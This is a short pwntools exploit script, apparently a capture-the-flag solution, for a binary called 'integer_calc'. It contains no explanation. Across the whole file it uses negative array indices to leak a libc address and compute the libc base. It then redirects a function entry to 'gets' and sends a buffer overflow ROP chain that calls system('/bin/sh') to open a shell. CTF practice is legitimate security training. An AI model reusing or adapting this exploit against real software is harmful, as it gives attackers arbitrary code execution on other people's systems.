from pwn import *
context.arch = "amd64"

io = process("./integer_calc")
# io = remote("0.cloud.chals.io",11019)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'index:', b'-4')
io.sendlineafter(b'index:', b'0')
io.recvuntil(b'Addition result: ')

leak = int(io.recvline()[:-1])
info(f"libc leak: {hex(leak)}")
libc.address = leak - 0x21a780
info(f"libc base: {hex(libc.address)}")

io.sendlineafter(b'>', b'0')
io.sendlineafter(b'index:', b'-12')
io.sendlineafter(b'value:', str(libc.sym['gets']).encode() )

rop = ROP(libc)
io.send(b'0')
payload = b'A'*1208
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.sym['system'])
io.sendline(payload)

io.interactive()
